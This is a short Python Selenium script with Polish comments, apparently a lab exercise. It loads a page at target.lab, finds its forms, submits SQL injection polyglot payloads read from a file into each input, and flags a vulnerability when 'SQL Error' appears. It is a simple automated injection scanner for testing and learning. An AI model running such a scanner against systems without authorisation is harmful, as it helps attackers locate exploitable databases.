from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys

options= Options()
#options.add_argument("--headless=new") # do chroma operacje sa wyswietalane ale bez okienka
options.add_experimental_option("detach", True) #po zakonczeniu skryptu okno pozostaje otwarte

driver = webdriver.Chrome(options=options)
driver.get("http://target.lab/") # z https nie zadziala bo jest http z przkierowaniem na https i odwolujemy sie do elementow ktore nie zostaly wyrenderowane
driver.set_window_size(1920, 1080) # ustawiamy rozdzielczosc okna 

# otwieramy plik z zapytaniami do inputu
sqli_polyglots_file = open("./sqli_poliglots.txt")
sqli_poliglots = sqli_polyglots_file.readlines()
sqli_poliglots = [polyglot.strip() for polyglot in sqli_poliglots]


#szukamy formularzy
forms= driver.find_elements(By.XPATH, "//form")  #XPATH-sposob wyszukiwania, find_element(jedne elemet) find_elements(kilka)
html= driver.find_element(By.XPATH, "//html")  

  
  # szukamy atrybutu id w formularzach
for form in forms:
    print(f" [+] Found form id: {form.get_attribute('id')}")
    #szukamy inputow w formularzach 
    inputs = form.find_elements(By.XPATH, ".//input") #nalezy dodsc kropke poniewaz szukamy inputow wewnatrz formularza
    button =  form.find_element(By.XPATH, ".//button") #jesli jest button a nie input type submit
    #szukamy atrybutu name w inputach
    for form_input in inputs:
            print(f"\t - input name: {form_input.get_attribute('name')}")
            #wypelniamy formularz i go wysylamy
            for payload in sqli_poliglots:
                form_input.send_keys(payload)
                button.click()
                if "SQL Error" in html.get_attribute("innerHTML"): #sprawdzamy zawartosc html w momencie jej pobrania
                    print(f"\t\t- Vulnerability: SQL Injection!!")
                    print(f"\t\t- payload; {payload}")
